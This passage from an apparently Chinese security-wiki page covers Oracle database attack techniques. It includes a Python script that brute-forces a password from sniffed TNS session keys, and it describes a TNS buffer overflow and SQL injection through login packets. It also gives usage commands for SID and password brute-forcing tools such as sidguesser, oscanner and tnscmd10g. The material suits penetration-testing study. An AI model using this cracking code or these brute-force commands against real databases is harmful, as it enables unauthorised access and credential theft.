+<p>​        这个过程可知上面TNS劫持包中取得的加密信息：AUTH_SESSKEY，AUTH_SESSKEY_CLIENT，AUTH_PASSWORD，AUTH_VFR_DATA这四个值是解密的关键。我们把他们按照SHA1,MD5，AES192进行一系列处理。最终通过数据字典碰撞得到密码明文。</p>
+<pre><code>import hashlib
+    from Crypto.Cipher import AES
+def decrypt(session,salt,password):
+    pass_hash= hashlib.sha1(password+salt)
+    key =pass_hash.digest() + &#39;\x00\x00\x00\x00&#39;
+    decryptor= AES.new(key,AES.MODE_CBC)
+    plain =decryptor.decrypt(session)
+    return plain
+session_hex =&#39;EA2043CB8B46E3864311C68BDC161F8CA170363C1E6F57F3EBC6435F541A8239B6DBA16EAAB5422553A7598143E78767&#39;
+  
+salt_hex = &#39;A7193E546377EC56639E&#39;
+  
+passwords = [&#39;test&#39;,&#39;password&#39;,&#39;oracle&#39;,&#39;demo&#39;]
+  
+for password in passwords:
+    session_id= decrypt(session_hex.decode(&#39;hex&#39;),salt_hex.decode(&#39;hex&#39;),password)
+    print&#39;Decrypted session_id for password &quot;%s&quot; is %s&#39; %(password,session_id.encode(&#39;hex&#39;))
+    if session_id[40:] == &#39;\x08\x08\x08\x08\x08\x08\x08\x08&#39;:
+           print&#39;PASSWORD IS &quot;%s&quot;&#39; % password
+           break
+</code></pre>
+<h3 id="TNS缓冲区溢出"><a href="#TNS缓冲区溢出" class="headerlink" title="TNS缓冲区溢出"></a>TNS缓冲区溢出</h3><p>ORACLE调用系统用户做认证</p>
+<p>CVE-2002-0965</p>
+<p>SERVICE_NAME值超过20字节，导致溢出。</p>
+<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/11.png"></p>
+<h2 id="Oracle-Database-SQL注入漏洞"><a href="#Oracle-Database-SQL注入漏洞" class="headerlink" title="Oracle Database SQL注入漏洞"></a>Oracle Database SQL注入漏洞</h2><p><strong>一、直接sql语句</strong></p>
+<p>​    第二个请求有用户名和密文口令，下面有名称值对列表，描述客户端的属性，这部分可替换成任何sql语句，在sys环境执行。登录数据库时就可以创建用户。</p>
+<p><img src="/10.PNG"></p>
+<p><strong>二、PL/SQL语言</strong></p>
+<p>匿名块：单次调用</p>
+<p>命名块：有名称，存储在服务器，可多次调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">BEGIN</span><br><span class="line">EXCEPTION</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
+
+<p>变量的作用</p>
+<p>在DECLARE阶段声明</p>
+<p>每一行只能声明一个变量</p>
+<p>声明标识符不能超过30字符，第一个字符为字母，不分大小写，不能用 -，不能用保留字，不能和引用的列同名，列名的优先级别高于变量。</p>
+<p>PL/SQL变量：</p>
+<p>复合变量：数组、记录、PL/SQL表</p>
+<p>非PL/SQL变量</p>
+<h2 id="Oracle-数据库评估工具"><a href="#Oracle-数据库评估工具" class="headerlink" title="Oracle 数据库评估工具"></a>Oracle 数据库评估工具</h2><h3 id="sidguesser"><a href="#sidguesser" class="headerlink" title="sidguesser"></a><strong>sidguesser</strong></h3><p>​        基于字典的SID爆破工具</p>
+<ul>
+<li>Oracle 数据库实例名称SID</li>
+<li>一个数据库服务器可以创建多个数据库实例</li>
+<li>SID是数据访问的入口</li>
+</ul>
+<p>​        Oracle是一个大型的数据库管理系统，在一台Oracle服务器上，我们可以为不同的应用创建各自独立的数据库实例。为了方便管理和访问不同的数据库实例，操作系统通过SID来识别不同的数据库。作为渗透测试者，发现库实例的SID是实现数据访问的第一步。sidguesser是一个基于字典的SID枚举工具，帮助渗透测试者发现数据访问的入口。</p>
+<p>​        使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sidguess -i IP -d dict.txt		</span><br></pre></td></tr></table></figure>
+
+<h3 id="oscanner"><a href="#oscanner" class="headerlink" title="oscanner"></a><strong>oscanner</strong></h3><p>​        oscanner是一款针对oracle数据库服务器进行安全评估的框架软件，功能包括SID、身份信息、密码策略、用户角色权限等的爆破和枚举检查。由于此工具内建字典过于简陋，因此要想发挥应有的作用，我们必须手动完善字典内容。</p>
+<ul>
+<li><p>Java开发的Oracle安全评估框架</p>
+</li>
+<li><p>基于插件、字典的架构</p>
+</li>
+<li><p>SID枚举</p>
+</li>
+<li><p>密码爆破</p>
+</li>
+<li><p>Oracle版本枚举</p>
+</li>
+<li><p>账号角色枚举</p>
+</li>
+<li><p>账号权限枚举</p>
+</li>
+<li><p>审计信息枚举</p>
+</li>
+<li><p>密码策略枚举（自己配置密码字典，默认密码字典太简单）</p>
+</li>
+<li><p>数据库链接枚举</p>
+<p>​    配置文件</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/oscanner/default.conf</span><br><span class="line">/usr/share/oscanner/diftionary.txt</span><br><span class="line">/usr/share/oscanner/users.txt</span><br><span class="line">/usr/share/oscanner/service.txt</span><br><span class="line">/usr/share/oscanner/oracleplugins.default</span><br><span class="line">/usr/share/oscanner/accounts.default</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oscanner -s server -f serverlist -P 1521</span><br></pre></td></tr></table></figure>
+
+<h3 id="tnscmd10g"><a href="#tnscmd10g" class="headerlink" title="tnscmd10g"></a><strong>tnscmd10g</strong></h3><p>​        Oracle数据库管理系统默认的服务端口是TCP  1521。在早期版本的Oracle系统中，通过对此端口的探测，可以获得大量系统信息，这给渗透测提供了有利的前提。tnscmd10g  主要针对7-9版本的Oracle数据库服务器，进行应用和操作系统层面的信息收集。同时也可以利用漏洞，直接输入并执行系统指令，上传和启动后门程序。10g以后版本的Oracle数据库大大提升了系统的安全性，使得本工具效果受限。</p>
+<ul>
+<li>针对Oracle 7-9i的信息收集工具</li>
+<li>向TNS监听程序发送指令（TCP 1521）</li>
+<li>爆破SID</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tnscmd10g verssion -h 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    Oracle Database PL/SQL注入漏洞原理
+                
+            </div>
+        </a>
+    
+    
+        <a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">SQL Server数据库安全加固</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            Tahir &copy; 2021 
+            <a rel="external nofollow noopener noreferrer" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
